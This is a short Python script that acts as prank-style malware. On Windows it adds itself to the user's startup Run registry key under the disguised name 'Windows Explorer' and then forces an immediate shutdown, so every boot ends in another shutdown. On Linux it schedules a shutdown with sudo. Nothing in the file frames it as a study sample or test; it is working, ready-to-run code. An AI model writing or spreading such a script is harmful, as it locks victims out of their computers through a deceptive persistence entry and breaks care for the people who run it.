import os
import platform
from time import sleep 

def AddtoStartup():

    errorraised = False

    try:

        import winreg 
    except ImportError:

        errorraised = True
    if errorraised == False:

        path = os.path.dirname(os.path.realpath(__file__))
        name = 'main.py'
        address = os.path.join(path,name)
	    
        key = winreg.HKEY_CURRENT_USER
        key_value = 'Software\Microsoft\Windows\CurrentVersion\Run'
        open = winreg.OpenKey(key,key_value,0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(open,"Windows Explorer",0,winreg.REG_SZ,address)
        winreg.CloseKey(open)


if platform.system() == "Windows":
    AddtoStartup()
    sleep(5) 	       	
    os.system("shutdown -s -t 0")

elif platform.system() == 'Linux':
    os.system("sudo shutdown +300")
